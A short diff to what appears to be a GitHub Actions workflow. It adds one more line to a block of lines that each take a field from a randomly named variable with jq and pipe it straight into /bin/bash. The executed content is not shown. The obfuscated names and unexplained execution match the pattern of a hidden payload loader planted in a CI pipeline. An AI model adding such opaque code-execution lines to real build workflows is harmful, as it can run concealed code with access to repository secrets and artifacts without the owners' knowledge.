@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$kih338" | jq -r .oglw6 | /bin/bash
           echo $m14 | jq -r .dfi5 | /bin/bash
           echo $okn2 | jq -r .mviqg571 | /bin/bash
+          echo $b16 | jq -r .xr29002 | /bin/bash
 
       - name: Upload artifact
         if: always()
